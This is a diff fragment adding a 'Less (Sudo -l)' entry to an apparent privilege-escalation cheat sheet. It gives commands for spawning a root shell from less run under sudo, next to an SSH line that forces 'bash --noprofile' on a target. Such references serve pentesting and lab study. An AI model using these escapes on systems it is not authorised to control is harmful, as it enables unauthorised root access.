@@ -174,3 +174,10 @@ Using a fine-grained set of privileges: Use of capability can be more clearly un
 
     ssh -i id_rsa tom@target-ip -t "bash —noprofile"
             
+### Less (Sudo  -l)
+
+  If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    sudo less /etc/profile
+    !/bin/sh
+
